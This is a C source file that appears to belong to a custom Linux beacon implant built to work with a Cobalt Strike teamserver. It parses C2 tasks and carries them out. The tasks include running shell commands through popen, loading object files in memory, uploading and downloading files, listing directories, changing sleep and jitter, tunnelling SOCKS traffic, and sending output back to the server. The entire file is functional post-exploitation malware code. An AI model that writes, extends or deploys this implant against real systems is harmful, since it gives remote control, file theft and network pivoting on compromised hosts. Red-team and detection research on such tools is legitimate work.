#include "commands.h"
#include "beacon.h"
#include "config.h"
#include "files.h"
#include "ELFRunner_include.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <time.h>
#include "debug.h"
#include "pivot.h"

// External beacon state - will be set by main
extern beacon_state_t* g_beacon_state;

// Global sleep configuration (extern from main.c)
extern int g_sleep_time_ms;
extern int g_jitter_percent;

void pivot_callback_func(const char * buffer, int length, int type) {
    send_output_to_server((const uint8_t*)buffer, length, type);
}

// Helper function to send output back to server
void send_output_to_server(const uint8_t *output, size_t output_len, uint32_t callback_type)
{
    if (!g_beacon_state)  // Only check for beacon state
    {
        return;
    }
    
    // Build packet: [4 bytes callback type][output data]
    size_t packet_len = 4 + output_len;
    uint8_t *packet = malloc(packet_len);
    
    uint32_t callback_type_be = htonl(callback_type);
    memcpy(packet, &callback_type_be, 4);
    
    // Copy output data only if it exists
    if (output && output_len > 0) {
        memcpy(packet + 4, output, output_len);
    }
    
    DEBUG_PRINT("[*] Sending %zu bytes of output to server (packet size: %zu, callback_type: 0x%02x)\n=========\n",  output_len, packet_len, callback_type);
    
    beacon_send_output(g_beacon_state, (char*)packet, packet_len);
    free(packet);
}

int list_directory(const char *path, uint8_t **output, size_t *output_len)
{
    DIR *dir = opendir(path);
    if (!dir) {
        *output_len = snprintf(NULL, 0, "Failed to open directory '%s'\n", path) + 1;
        *output = malloc(*output_len);
        if (!*output)
        {
            ERROR_PRINT("Failed to allocate memory for response output\n");
            return -1;
        }

        snprintf((char*)*output, *output_len, "Failed to open directory '%s'\n", path);
        return 0;
    }

    size_t capacity = 256;
    size_t len = 0;
    char *buffer = malloc(capacity);
    if (!buffer) {
        closedir(dir);
        return -1;
    }

    buffer[0] = '\0';

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL)
    {
        /* Skip . and .. */
        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0)
            continue;

        char line[1024];
        snprintf(line, sizeof(line), "%s\n", entry->d_name);

        size_t line_len = strlen(line);

        /* Grow output buffer if needed */
        if (len + line_len + 1 > capacity) {
            capacity *= 2;
            char *tmp = realloc(buffer, capacity);
            if (!tmp) {
                free(buffer);
                closedir(dir);
                return -1;
            }
            buffer = tmp;
        }

        memcpy(buffer + len, line, line_len);
        len += line_len;
        buffer[len] = '\0';
    }

    closedir(dir);

    *output = (uint8_t*)buffer;
    *output_len = len + 1;

    return 0;
}

// Returns 1 if the task buffer can be fully parsed with this layout.
// Older servers: task_header_len = 0
// Newer servers: task_header_len = 8 (per-task metadata before command args)
static int validate_task_layout(const uint8_t *task_buffer, size_t task_len, size_t task_header_len, size_t *task_count_out)
{
    size_t offset = 0;
    size_t task_count = 0;

    while (offset + 8 <= task_len)
    {
        uint32_t command_id = ntohl(*(uint32_t*)(task_buffer + offset));
        uint32_t data_length = ntohl(*(uint32_t*)(task_buffer + offset + 4));
        offset += 8;

        // Quick sanity check to reduce false positives when probing layouts.
        if (command_id == 0 || command_id > 0xFFFF)
        {
            return 0;
        }

        if (task_header_len + (size_t)data_length > task_len - offset)
        {
            return 0;
        }

        offset += task_header_len + data_length;
        task_count++;
    }

    if (task_count_out)
    {
        *task_count_out = task_count;
    }

    return (task_count > 0 && offset == task_len);
}

int commands_execute(const uint8_t *task_data, size_t task_len, uint8_t **output, size_t *output_len, uint32_t *callback_type)
{
    if (task_len < 4)
	{
        return -1;
    }
    
    // Default callback type is CALLBACK_OUTPUT
    *callback_type = CALLBACK_OUTPUT;
    
    // Parse command type (first 4 bytes, BIG endian)
    uint32_t command = ntohl(*(uint32_t*)task_data);
    const uint8_t *cmd_data = task_data + 4;
    size_t cmd_data_len = task_len - 4;
    
    DEBUG_PRINT("Tasked to execute command: %u (0x%02x)\n", command, command);
	
	// Print first 30 bytes for debugging
#ifdef DEBUG
	printf("Raw bytes:\n");
	for(size_t i = 0; i < 50 && i < cmd_data_len; i++)
	{
		printf("%02x ", cmd_data[i]);
		if ((i+1) % 10 == 0) printf("\n");
	}
	printf("\n");
#endif
	
#ifdef DEBUG
    printf("Command data length: %zu bytes\n", cmd_data_len);
    if (cmd_data_len > 0 && cmd_data_len <= 64)
	{
        printf("Command data: ");
        for(size_t i = 0; i < cmd_data_len; i++)
		{
            printf("%02x", cmd_data[i]);
        }
        printf("\n");
    }
#endif
    
    switch (command) {

        /*
            // making new command requires 
            *output_len = snprintf(NULL, 0, "String: %s\n", str) + 1;
            *output = malloc(*output_len);
            snprintf((char*)*output, *output_len, "String: %s\n", str);
            *callback_type = CALLBACK_OUTPUT;

            otherwise do this if fails:
            *output_len = snprintf(NULL, 0, "Failed to do task!\n") + 1;
            *output = malloc(*output_len);
            snprintf((char*)*output, *output_len, "Failed to do task!\n");
            *callback_type = CALLBACK_OUTPUT;
        */

        // using ID 200 because the way ID 100 (COMMAND_INLINE_EXECUTE_OBJECT) sends BOF data changed in 4.12 and maybe 4.11.
        // It stores it in the Beacon Data store and passes a reference to it, and then passes the BOF args only
        // Using a custom command ID of 200 sends the BOF data the same way no matter the version
        // simple, funny fix :)
        case 200: { 
            /* Format:
            [4 bytes] BOF size
            [N bytes] BOF bytes
            [4 bytes] argument size 1
            [4 bytes] argument size 2
            [N bytes] arguments
            */
            DEBUG_PRINT("Parsing Linux Inline Execute command!\n");

            if (cmd_data_len < 4) {
                // Not enough data for bof_size
                break;
            }

            int bof_size = ntohl(*(uint32_t*)cmd_data);
            
            // The pointer to argument_size is cmd_data + sizeof(bof_size) + bof_size
            uint8_t *p_arg_size_field = cmd_data + 4 + bof_size;

            if ((p_arg_size_field + 4) > (cmd_data + cmd_data_len)) {
                // Not enough data for argument_size field
                DEBUG_PRINT("Not enough data for arg size field\n");
                DEBUG_PRINT("BOF size: %d\n", bof_size);
                DEBUG_PRINT("Arg size: 0\n");
                break;
            }

            int argument_size = ntohl(*(uint32_t*)p_arg_size_field);

            DEBUG_PRINT("BOF size: %d\n", bof_size);
            DEBUG_PRINT("Arg size: %d\n", argument_size);

            // Calculate start and end pointers for BOF bytes
            const uint8_t* bof_bytes_start = cmd_data + 4; // After bof_size
            const uint8_t* bof_bytes_end = bof_bytes_start + bof_size;
        #ifdef DEBUG
            printf("BOF bytes (%d bytes): ", bof_size);
            if (bof_bytes_end <= (cmd_data + cmd_data_len)) {
                for (int i = 0; i < bof_size; i++) {
                    printf("%02x ", bof_bytes_start[i]);
                }
            } else {
                printf("<truncated/invalid BOF bytes>");
            }
            printf("\n");
        #endif

            // Calculate start and end pointers for BOF arguments
            const uint8_t *bof_args_start = cmd_data + 4 + bof_size; // After bof_size, bof_data, and argument_size field
            const uint8_t *bof_args_end = bof_args_start + argument_size;
        #ifdef DEBUG
            printf("BOF arguments (%d bytes): ", argument_size);
            if (bof_args_end <= (cmd_data + cmd_data_len)) {
                for (int i = 0; i < argument_size; i++) {
                    printf("%02x ", bof_args_start[i]);
                }
            } else {
                printf("<truncated/invalid BOF arguments>");
            }
            printf("\n");
        #endif
            

            int outputdataLen = 0;
            int checkcode = ELFRunner("go", bof_bytes_start, bof_size, (unsigned char*)bof_args_start, argument_size);
            if (checkcode == 0)
            {
                char* outputdata = BeaconGetOutputData(&outputdataLen);
                DEBUG_PRINT("Output data : %s\n", outputdata);

                // making new command requires 
                *output_len = snprintf(NULL, 0, "%s\n", outputdata) + 1;
                *output = malloc(*output_len);
                snprintf((char*)*output, *output_len, "%s\n", outputdata);
                *callback_type = CALLBACK_OUTPUT;
                free(outputdata);
                return 0;
            }
            else
            {
                *output_len = snprintf(NULL, 0, "Failed to execute BOF!\n") + 1;
                *output = malloc(*output_len);
                snprintf((char*)*output, *output_len, "Failed to execute BOF!\n");
                *callback_type = CALLBACK_OUTPUT;
            }

            return -1; 
        }
        
        case COMMAND_EXECUTE_JOB: {
            
			// Windows Shell command
			// Format Example: %COMSPEC% /C whoami
			// %COMSPEC% /C bytes: 25 43 4f 4d 53 50 45 43 25 00 00 00 0a 20 2f 43 20
			// whoami bytes: 77 68 6f 61 6d 69 00 00
            
            DEBUG_PRINT("Parsing COMMAND_EXECUTE_JOB command\n");
            
			int offset = 4; // first 4 bytes seem to be the size of the %COMSPEC%, but I don't actually know what it is for
            offset += 17; // After the 4 byte len at the beginning, the following 17 bytes are %COMSPEC% /C
			int cmd_len = cmd_data_len - offset; // We get the length of the actual command to run
			
			if (cmd_len < 1)
			{
				ERROR_PRINT("Invalid command!");
				*output = NULL;
				*callback_type = CALLBACK_OUTPUT;
				return -1;
				
			}
			
            // Extract the actual command
            char *shell_cmd = malloc(cmd_len + 1);
            memcpy(shell_cmd, cmd_data + offset, cmd_len);
            shell_cmd[cmd_len] = '\0';
            
            DEBUG_PRINT("Running shell command: '%s'\n", shell_cmd);
            
			char *shell_cmd_with_stderr = malloc(strlen(shell_cmd) + 6); // extra space for " 2>&1\0"
			sprintf(shell_cmd_with_stderr, "%s 2>&1", shell_cmd);
			
            // Execute using popen to capture output
            FILE *fp = popen(shell_cmd_with_stderr, "r");
            if (!fp)
			{
                ERROR_PRINT("popen failed\n");
                free(shell_cmd);
				free(shell_cmd_with_stderr);
				*callback_type = CALLBACK_OUTPUT;
                return -1;
            }
            
            // Read output
            char buffer[4096];
            size_t total_read = 0;
            *output = NULL;
            
            while (fgets(buffer, sizeof(buffer), fp) != NULL)
			{
                size_t len = strlen(buffer);
                *output = realloc(*output, total_read + len);
                memcpy(*output + total_read, buffer, len);
                total_read += len;
            }
            
            *output_len = total_read;
            int status = pclose(fp);
            free(shell_cmd);
			free(shell_cmd_with_stderr);
            
            DEBUG_PRINT("Command executed, status=%d, output length: %zu\n", status, total_read);
            
            // Use standard output callback
            *callback_type = CALLBACK_OUTPUT;
            return 0;
        }
        
        case COMMAND_DIE: {
            // Exit beacon - send CALLBACK_DEAD before exiting
            DEBUG_PRINT("Received DIE command, sending CALLBACK_DEAD and exiting...\n");
            
            // Set callback type to CALLBACK_DEAD (0x1a)
            *callback_type = CALLBACK_DEAD;
            
            // No output data needed for CALLBACK_DEAD
            *output = NULL;
            *output_len = 0;
            
            // Return 0 to indicate we want to send the callback
            // The actual exit will happen after the callback is sent
            return 0;
        }
        
        case COMMAND_SLEEP: {
            // Change sleep time
            // Format: [4 bytes: sleep_ms BIG-endian][4 bytes: jitter_percent BIG-endian]
            // Note: Cobalt Strike already sends the value in milliseconds
            if (cmd_data_len < 8)
			{
                *output_len = snprintf(NULL, 0, "Invalid sleep arguments\n") + 1;
                *output = malloc(*output_len);
                if (*output) {
                    snprintf((char*)*output, *output_len, "Invalid sleep arguments\n");
                }
                *callback_type = CALLBACK_OUTPUT;
                return -1;
            }

            uint32_t sleep_ms = ntohl(*(uint32_t*)cmd_data);
            uint32_t new_jitter = ntohl(*(uint32_t*)(cmd_data + 4));

            if (sleep_ms < 200) {
                g_sleep_time_ms = 200;
                g_jitter_percent = 0;
            } else {
                g_sleep_time_ms = sleep_ms;
                g_jitter_percent = new_jitter;
            }

            DEBUG_PRINT("Sleep time changed to: %u ms, jitter: %u%%\n", g_sleep_time_ms, g_jitter_percent);

            // Send confirmation
            char msg[128];
            int msg_len = snprintf(msg, sizeof(msg), "Sleep set to %u ms (jitter %u%%)\n", g_sleep_time_ms, g_jitter_percent);
            *output = malloc(msg_len);
            if (!*output)
            {
                *callback_type = CALLBACK_OUTPUT;
                return -1;
            }
            memcpy(*output, msg, msg_len);
            *output_len = msg_len;
            *callback_type = CALLBACK_OUTPUT;
            return 0;
        }
        
        case COMMAND_CD: {
            // Change directory
            if (cmd_data_len == 0)
			{
				*callback_type = CALLBACK_OUTPUT;
                return -1;
            }
            
            char *dir = malloc(cmd_data_len + 1);
            memcpy(dir, cmd_data, cmd_data_len);
            dir[cmd_data_len] = '\0';
            
            if (chdir(dir) == 0)
			{
                char cwd[1024];
                getcwd(cwd, sizeof(cwd));
                *output_len = snprintf(NULL, 0, "Changed directory to: %s\n", cwd) + 1;
                *output = malloc(*output_len);
                snprintf((char*)*output, *output_len, "Changed directory to: %s\n", cwd);
                *callback_type = CALLBACK_OUTPUT;
            }
			else
			{
                *output_len = snprintf(NULL, 0, "Failed to change directory!\n") + 1;
                *output = malloc(*output_len);
                snprintf((char*)*output, *output_len, "Failed to change directory!\n");
                *callback_type = CALLBACK_OUTPUT;
            }
            
            free(dir);
            return 0;
        }

        case COMMAND_PWD: {
            char cwd[1024];
            if (getcwd(cwd, sizeof(cwd)) != NULL)
            {
                *output_len = snprintf(NULL, 0, "%s\n", cwd) + 1;
                *output = malloc(*output_len);
                snprintf((char *)*output, *output_len, "%s\n", cwd);
                *callback_type = CALLBACK_PWD;  // Use PWD-specific callback
            }
            else
            {
                *output_len = snprintf(NULL, 0, "Failed to get current working directory!\n") + 1;
                *output = malloc(*output_len);
                snprintf((char *)*output, *output_len, "Failed to get current working directory!\n");
                *callback_type = CALLBACK_OUTPUT;
            }

            return 0;
        }
        
        case COMMAND_FILE_LIST: {
            /*
                ff ff ff fe 00 00 00 13 2f 68     0x13 (19) is the length of the string with a \* at the end. So -2.
                6f 6d 65 2f 65 65 2f 54 6f 6f
                6c 73 2f 63 32 5c 2a
            */
            int dirLengthOffset = 7;

            if (cmd_data_len <= dirLengthOffset) {
                fprintf(stderr, "Command too short\n");
                *callback_type = CALLBACK_OUTPUT;
                return -1;
            }

            uint8_t dirLength = cmd_data[dirLengthOffset] - 2; // Doing -2 because the directory string also contains a \* at the end for some reason.
            DEBUG_PRINT("String length: %u\n", dirLength);

            /* Validate bounds */
            if (dirLengthOffset + dirLength + 2 > cmd_data_len) {
                fprintf(stderr, "Invalid directory length\n");
                *callback_type = CALLBACK_OUTPUT;
                return -1;
            }

            /* Allocate exact size (+1 for NUL) */
            char *DirToList = malloc(dirLength + 1);
            if (!DirToList)
            {
                ERROR_PRINT("Failed to allocate space for directory name\n");
                *callback_type = CALLBACK_OUTPUT;
                return -1;
            }

            /* Copy raw bytes */
            memcpy(DirToList, cmd_data + dirLengthOffset + 1, dirLength);
            DirToList[dirLength] = '\0';

            DEBUG_PRINT("Directory to list: %s\n", DirToList);

            list_directory(DirToList, output, output_len);
            *callback_type = CALLBACK_OUTPUT;

            free(DirToList);

            return 0;
        }
        
        case COMMAND_UPLOAD:
        case COMMAND_UPLOAD_CONTINUE: {
            DEBUG_PRINT("Parsing COMMAND_UPLOAD command\n");

            if (cmd_data_len < 4) {
                *callback_type = CALLBACK_ERROR;
                return -1;
            }

            uint32_t file_name_len = ntohl(*(uint32_t*)cmd_data);
            if (file_name_len == 0 || file_name_len > cmd_data_len - 4) {
                *callback_type = CALLBACK_ERROR;
                return -1;
            }

            char *file_name = malloc(file_name_len + 1);
            if (!file_name) {
                *callback_type = CALLBACK_ERROR;
                return -1;
            }
            memcpy(file_name, cmd_data + 4, file_name_len);
            file_name[file_name_len] = '\0';

            const uint8_t *file_content = cmd_data + 4 + file_name_len;
            size_t file_content_len = cmd_data_len - 4 - file_name_len;

            const char *mode = (command == COMMAND_UPLOAD) ? "wb" : "ab";

            FILE *outfile = fopen(file_name, mode);
            if (!outfile) {
                free(file_name);
                *output_len = snprintf(NULL, 0, "Failed to open file for writing: %s", file_name) + 1;
                *output = malloc(*output_len);
                snprintf((char*)*output, *output_len, "Failed to open file for writing: %s", file_name);
                *callback_type = CALLBACK_ERROR;
                return 0;
            }

            fwrite(file_content, 1, file_content_len, outfile);
            fclose(outfile);

            *output_len = snprintf(NULL, 0, "Uploaded %zu bytes to %s", file_content_len, file_name) + 1;
            *output = malloc(*output_len);
            snprintf((char*)*output, *output_len, "Uploaded %zu bytes to %s", file_content_len, file_name);
            *callback_type = CALLBACK_OUTPUT;
            
            free(file_name);
            return 0;
        }

        case COMMAND_DOWNLOAD: {
            DEBUG_PRINT("Parsing COMMAND_DOWNLOAD command\n");
            command_download(cmd_data, cmd_data_len);
            *output_len = 0;
            *output = NULL;
            return 0;
        }

        case COMMAND_CANCEL_DOWNLOAD: {
            DEBUG_PRINT("Parsing COMMAND_DOWNLOAD_STOP command\n");
            command_download_stop(cmd_data, cmd_data_len);
            *output_len = 0;
            *output = NULL;
            return 0;
        }

        case COMMAND_LISTEN: {
            DEBUG_PRINT("Parsing COMMAND_LISTEN command for SOCKS\n");
            command_listen_socks(cmd_data, cmd_data_len, pivot_callback_func);
            *output_len = 0;
            *output = NULL;
            return 0;
        }

        case COMMAND_CONNECT: {
            // COMMAND_CONNECT (14): Initiate a new SOCKS connection to a target.
            // The C2 server sends the target information in the following format:
            // [4 bytes] Socket ID (big endian)
            // [2 bytes] Target port (big endian)
            // [N bytes] Target host (string)
            DEBUG_PRINT("Parsing COMMAND_CONNECT command for SOCKS\n");
            command_connect_socks(cmd_data, cmd_data_len, pivot_callback_func);
            *output_len = 0;
            *output = NULL;
            return 0;
        }

        case COMMAND_SEND: {
            // COMMAND_SEND (15): Forward data from the C2 server to an established SOCKS connection.
            // The data format is:
            // [4 bytes] Socket ID (big endian)
            // [N bytes] Data to write to the socket
            DEBUG_PRINT("Parsing COMMAND_SEND command for SOCKS\n");
            command_send_socks(cmd_data, cmd_data_len);
            *output_len = 0;
            *output = NULL;
            return 0;
        }

        case COMMAND_CLOSE: {
            // COMMAND_CLOSE (16): Close an active SOCKS connection.
            // The data format is:
            // [4 bytes] Socket ID (big endian) to be closed
            DEBUG_PRINT("Parsing COMMAND_CLOSE command for SOCKS\n");
            command_close_socks(cmd_data, cmd_data_len);
            *output_len = 0;
            *output = NULL;
            return 0;
        }

        default:
		{
			DEBUG_PRINT("[!] Unsupported command ID: %u (0x%02x), replying with echoed callback type\n", command, command);

			char msg[160];
			int msg_len = snprintf(msg, sizeof(msg),
				"Command %u (0x%02x) is not supported on this Linux beacon\n",
				command, command);

			*output = malloc(msg_len);
			if (!*output) {
				*output_len = 0;
				*callback_type = CALLBACK_ERROR;
				return -1;
			}
			memcpy(*output, msg, msg_len);
			*output_len = (size_t)msg_len;

			*callback_type = command;
			return 0;
        }
    }
}

int commands_parse_tasks(const uint8_t *task_buffer, size_t task_len)
{    
    /*
    The full task data is sent to this command

        Old server layout (v4.9):
            [4 bytes] Command ID
            [4 bytes] Length of command-specific data
            [N bytes] Command-specific data

        New server layout (v4.12):
            [4 bytes] Command ID
            [4 bytes] Length of command-specific data
            [8 bytes] Per-task metadata/header
            [N bytes] Command-specific data
    */

    DEBUG_PRINT("Parsing task buffer: %zu bytes total\n", task_len);
    #ifdef DEBUG
    printf("Raw task buffer data: ");
    for(size_t i = 0; i < task_len && i < 64; i++) {
        printf("%02x", task_buffer[i]);
    }
    printf("\n");
    #endif
	
    size_t v2_task_count = 0;
    size_t v1_task_count = 0;
    int v2_valid = validate_task_layout(task_buffer, task_len, 8, &v2_task_count);
    int v1_valid = validate_task_layout(task_buffer, task_len, 0, &v1_task_count);
    size_t task_header_len = 0;

    if (v2_valid && !v1_valid)
    {
        task_header_len = 8;
        DEBUG_PRINT("Detected task layout: new server format (8-byte per-task header)\n");
    }
    else if (v1_valid && !v2_valid)
    {
        task_header_len = 0;
        DEBUG_PRINT("Detected task layout: old server format (no per-task header)\n");
    }
    else if (v2_valid && v1_valid)
    {
        // Ambiguous payload: prefer newer layout.
        task_header_len = 8;
        DEBUG_PRINT("Detected ambiguous task layout (v2 tasks=%zu, v1 tasks=%zu), using new server format\n",
                    v2_task_count, v1_task_count);
    }
    else
    {
        ERROR_PRINT("[!] Could not determine task layout (old/new)\n");
        return -1;
    }

	size_t offset = 0;
    
    // LOOP through all tasks in the full task data buffer
    while (offset + 8 + task_header_len <= task_len)
	{
        // Command Specific Task
        // [4 bytes] Length of command-specific data
        // [8 bytes] Per-task metadata/header (4.12)
        // [N bytes] Command specific data

        // Read command ID (BIG endian / network byte order)
        uint32_t command_id = ntohl(*(uint32_t*)(task_buffer + offset));
        offset += 4;
        
        // Read data length (BIG endian / network byte order)
        uint32_t data_length = ntohl(*(uint32_t*)(task_buffer + offset));
        offset += 4;
        
        DEBUG_PRINT("Parsed task: Command=%u (0x%02x), Length=%u, offset=%zu\n", command_id, command_id, data_length, offset);
        
        // Each task contains 8 bytes of metadata before the command-specific args.
        if (task_header_len + data_length > task_len - offset)
		{
            DEBUG_PRINT("[!] Invalid task length: %u (+%zu header) (only %zu bytes remaining)\n",
                   data_length, task_header_len, task_len - offset);
            break;
        }
        
        // Build full task for this singular command
        size_t full_task_len = 4 + data_length;
        uint8_t *full_task = malloc(full_task_len);
        if (!full_task)
        {
            DEBUG_PRINT("[!] Failed to allocate memory for task execution buffer\n");
            break;
        }
        
        uint32_t cmd_be = htonl(command_id);
        memcpy(full_task, &cmd_be, 4);
        memcpy(full_task + 4, task_buffer + offset + task_header_len, data_length);
        
        DEBUG_PRINT("Executing task (total %zu bytes)\n", full_task_len);
        
        // Execute this specific task
        uint8_t* output = NULL;
        size_t output_len = 0;
        uint32_t callback_type = CALLBACK_OUTPUT;  // Will be set by commands_execute
        
        if (commands_execute(full_task, full_task_len, &output, &output_len, &callback_type) == 0)
		{
            // Special handling for COMMAND_DIE
            if (command_id == COMMAND_DIE)
            {
                // Send the CALLBACK_DEAD response
                DEBUG_PRINT("Sending CALLBACK_DEAD (0x%02x) to teamserver...\n", callback_type);
                send_output_to_server(output, output_len, callback_type);
                if (output) free(output);
                
                DEBUG_PRINT("CALLBACK_DEAD sent successfully\n");
                
                usleep(500);
                
                DEBUG_PRINT("Exiting beacon now...\n");
                
                // Clean up and exit
                free(full_task);
                exit(0);
            }
            
            if (output && output_len > 0)
			{
				// Print output for debugging (limit to 200 chars)
                DEBUG_PRINT("Command produced output (%zu bytes) with callback_type 0x%02x:\n", output_len, callback_type);
                size_t print_len = output_len < 200 ? output_len : 200;
                DEBUG_PRINT("%.*s%s\n", (int)print_len, (char*)output, output_len > 200 ? "..." : "");

                // Send with the callback type returned by commands_execute
                send_output_to_server(output, output_len, callback_type);
                free(output);

                // Small delay between consecutive output POSTs to prevent
                // "Dropped responses from session" errors when the teamserver
                // hasn't finished registering the session yet.
                usleep(100000); // 100ms
            }
			else
			{
                DEBUG_PRINT("Command executed successfully (no output)\n");
            }
        }
		else
		{
            DEBUG_PRINT("[!] Command execution failed\n");
        }
        
        free(full_task);
        offset += task_header_len + data_length;
    }
    
    if (offset < task_len)
	{
        DEBUG_PRINT("%zu bytes remaining in task buffer (possibly padding)\n", task_len - offset);
    }
    
    return 0;
}